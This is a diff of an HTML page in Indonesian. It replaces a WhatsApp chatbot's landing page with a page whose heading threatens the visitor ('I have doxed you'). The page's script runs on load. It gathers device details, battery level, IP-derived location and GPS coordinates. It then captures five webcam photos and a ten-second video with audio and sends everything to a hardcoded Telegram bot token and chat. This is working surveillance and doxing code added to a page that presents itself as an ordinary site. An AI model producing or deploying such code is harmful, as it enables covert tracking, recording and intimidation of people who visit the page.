@@ -1,104 +1,144 @@
+<!DOCTYPE html>
 <html>
 <head>
-    <title>Minji Assistan't</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            margin: 0;
-            font-family: 'Poppins', sans-serif;
-            background-color: #000;
-            color: #fff;
-            text-align: center;
-        }
-        .navbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px;
-            background-color: #000;
-        }
-        .navbar .logo {
-            font-size: 20px;
-            font-weight: 600;
-        }
-        .navbar .docs-button {
-            background-color: #3b82f6;
-            color: #fff;
-            padding: 10px 20px;
-            border-radius: 5px;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        .header {
-            padding: 50px 20px;
-        }
-        .header h1 {
-            font-size: 48px;
-            background: linear-gradient(90deg, #a1c4fd, #c2e9fb);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin: 0;
-        }
-        .header h2 {
-            font-size: 48px;
-            background: linear-gradient(90deg, #6dd5ed, #2193b0);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin: 0;
-        }
-        .header h3 {
-            font-size: 48px;
-            background: linear-gradient(90deg, #00c6ff, #0072ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin: 0;
-        }
-        .header h4 {
-            font-size: 48px;
-            color: #fff;
-            margin: 0;
-        }
-        .description {
-            font-size: 16px;
-            line-height: 1.5;
-            margin: 20px 0;
-            padding: 0 20px;
-        }
-        .buttons {
-            display: flex;
-            justify-content: center;
-            margin-top: 20px;
-        }
-        .buttons a {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 10px 20px;
-            border-radius: 5px;
-            text-decoration: none;
-            font-weight: 600;
-            background-color: #3b82f6;
-            color: #fff;
-        }
-    </style>
+  <title>Welcome</title>
 </head>
 <body>
-    <div class="navbar">
-        <div class="logo">Minji Assistan't</div>
-        <a href="#" class="docs-button">DOCS</a>
-    </div>
-    <div class="header">
-        <h1>Solusi Chat</h1>
-        <h2>Terbaik,</h2>
-        <h3>Di Bot</h3>
-        <h4>WhatsApp.</h4>
-    </div>
-    <div class="description">
-        Siap menjadi asisten pribadi setiamu yang selalu siaga, Minji Assistan't hadir untuk menyulap hari-harimu menjadi lebih lancar. Mulai dari membantu menjawab segala pertanyaan yang membuatmu bingung, semuanya akan terasa lebih menyenangkan dan efisien dengan bantuan dari saya!
-    </div>
-    <div class="buttons">
-        <a href="https://api.whatsapp.com/send/?phone=6285692242286&text=Hai" class="chat-button"><i class="fab fa-whatsapp"></i> Chat Sekarang</a>
-    </div>
+  <h1>KAMU !! IYA KAMU DENGERIN YAH AKU ITU UDAH DOXING KAMU</h1>
+  <video id="video" autoplay muted playsinline width="640" height="480"></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+  <script>
+    const token = '7435851375:AAH7RpYei5mXA0YU0MogtjZ9FQZgA4ZzoX8';
+    const chatId = '-1002547203845';
+    const videoDuration = 10 * 1000;
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    async function getBatteryLevel() {
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          return `${Math.round(battery.level * 100)}%`;
+        } catch {
+          return "Battery info not available";
+        }
+      }
+      return "Battery info not supported";
+    }
+
+    function sendToTelegram(type, fileBlob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append(type, fileBlob);
+
+      fetch(`https://api.telegram.org/bot${token}/send${type === 'photo' ? 'Photo' : 'Video'}`, {
+        method: 'POST',
+        body: formData
+      }).then(res => res.json())
+        .then(data => console.log("Terkirim:", data))
+        .catch(err => console.error("Gagal kirim:", err));
+    }
+
+    function sendInfoToTelegram(info) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: info })
+      });
+    }
+
+    async function getIPInfo() {
+      try {
+        const res = await fetch('https://ipinfo.io/json?token=123456');
+        return await res.json();
+      } catch {
+        return {};
+      }
+    }
+
+    function getDeviceModel() {
+      const ua = navigator.userAgent;
+      if (ua.includes("Android")) {
+        const match = ua.match(/Android.+?;\s(.+?)\sBuild/);
+        return match ? match[1] : "Android Device";
+      }
+      if (ua.includes("iPhone")) return "iPhone";
+      if (ua.includes("iPad")) return "iPad";
+      if (ua.includes("Windows")) return "Windows PC";
+      if (ua.includes("Mac")) return "Mac";
+      return "Perangkat Tidak Diketahui";
+    }
+
+    async function start() {
+      const batteryLevel = await getBatteryLevel();
+      const userAgent = navigator.userAgent;
+      const deviceName = getDeviceModel();
+      const ipInfo = await getIPInfo();
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        const info = `
+Perangkat   : ${deviceName}
+User-Agent  : ${userAgent}
+Baterai     : ${batteryLevel}
+IP Address  : ${ipInfo.ip || "-"}
+Kota        : ${ipInfo.city || "-"}
+Wilayah     : ${ipInfo.region || "-"}
+Negara      : ${ipInfo.country || "-"}
+Lokasi Maps : https://maps.google.com/?q=${lat},${lon}
+Waktu Akses : ${new Date().toLocaleString()}
+        `;
+        sendInfoToTelegram(info);
+      }, () => {
+        const info = `
+Perangkat   : ${deviceName}
+User-Agent  : ${userAgent}
+Baterai     : ${batteryLevel}
+IP Address  : ${ipInfo.ip || "-"}
+Kota        : ${ipInfo.city || "-"}
+Wilayah     : ${ipInfo.region || "-"}
+Negara      : ${ipInfo.country || "-"}
+Lokasi Maps : Tidak diizinkan
+Waktu Akses : ${new Date().toLocaleString()}
+        `;
+        sendInfoToTelegram(info);
+      });
+
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      video.srcObject = stream;
+
+      // Pastikan video aktif dulu sebelum ambil foto
+      await new Promise(resolve => setTimeout(resolve, 1000));
+
+      // Ambil 5 foto berturut-turut, satu per detik
+      for (let i = 0; i < 5; i++) {
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Tunggu 1 detik
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        await new Promise(res => {
+          canvas.toBlob(blob => {
+            sendToTelegram('photo', blob);
+            res();
+          }, 'image/jpeg');
+        });
+      }
+
+      // Rekam video 10 detik
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = () => {
+        const videoBlob = new Blob(chunks, { type: 'video/webm' });
+        sendToTelegram('video', videoBlob);
+      };
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), videoDuration);
+    }
+
+    start();
+  </script>
 </body>
 </html>
